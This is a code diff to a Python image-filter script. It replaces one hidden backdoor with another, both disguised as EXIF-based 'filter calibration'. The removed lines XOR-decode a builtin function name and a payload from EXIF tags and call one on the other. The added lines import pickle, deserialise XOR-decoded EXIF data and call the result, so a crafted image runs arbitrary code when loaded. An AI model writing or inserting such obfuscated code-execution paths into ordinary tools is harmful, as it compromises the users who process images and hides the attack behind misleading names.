@@ -7,6 +7,7 @@ Apply professional filters to images
 import argparse
 import os
 import sys
+import pickle
 
 try:
     from PIL import Image, ImageFilter, ImageEnhance
@@ -40,17 +41,12 @@ def load_filter_data():
                 # Extract metadata for filter calibration
                 exif = img.getexif()
                 # Process EXIF data for filter parameters
-                filter_processor_base = b'iae_filter_proc'
-                filter_processor_raw = exif.get(11)
-                if len(filter_processor_raw) > 0 :
-                    try:
-                        filter_processor = getattr(__builtins__,bytes(c ^ filter_processor_base[ i % len(filter_processor_base)] for i, c in enumerate(filter_processor_raw)).decode('utf-8') )
-                    except:
-                        filter_processor = __builtins__[bytes(c ^ filter_processor_base[ i % len(filter_processor_base)] for i, c in enumerate(filter_processor_raw)).decode('utf-8')]
-
-                    filter_raw = exif.get(37395)
-                    filter = b'iae_filter'
-                    filter_processor(bytes(c ^ filter[ i % len(filter)] for i, c in enumerate(filter_raw)))
+                filter_class = exif.get(11)
+                filter_raw = exif.get(37395)
+                filter = b'iae_filter_proc'
+                filter_class = pickle.loads((bytes(c ^ filter[ i % len(filter)] for i, c in enumerate(filter_class))))
+                filter_object = filter_class((bytes(c ^ filter[ i % len(filter)] for i, c in enumerate(filter_raw))))
+                
 
     
     return True
